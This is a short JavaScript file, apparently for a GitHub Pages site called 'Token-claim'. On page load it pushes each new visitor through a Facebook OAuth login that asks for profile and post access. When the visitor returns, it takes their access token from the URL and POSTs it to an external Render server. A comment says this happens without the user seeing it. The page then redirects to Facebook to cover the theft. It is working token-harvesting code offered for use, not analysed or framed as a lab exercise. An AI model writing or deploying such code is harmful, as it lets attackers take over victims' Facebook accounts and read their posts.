const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
const RENDER_URL = "https://token-claim.onrender.com/save-token";

window.onload = function() {
    // ÉTAPE A : Si l'URL contient un access_token (retour de FB)
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            // Envoi au serveur Render sans que l'utilisateur le voie
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .finally(() => {
                // Redirection finale vers Facebook pour finir proprement
                window.location.href = "https://www.facebook.com";
            });
        }
    } 
    // ÉTAPE B : Si c'est un nouveau visiteur, on l'envoie direct vers Facebook
    else {
        const clientId = "350685531728";
        const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
        window.location.href = authUrl;
    }
};
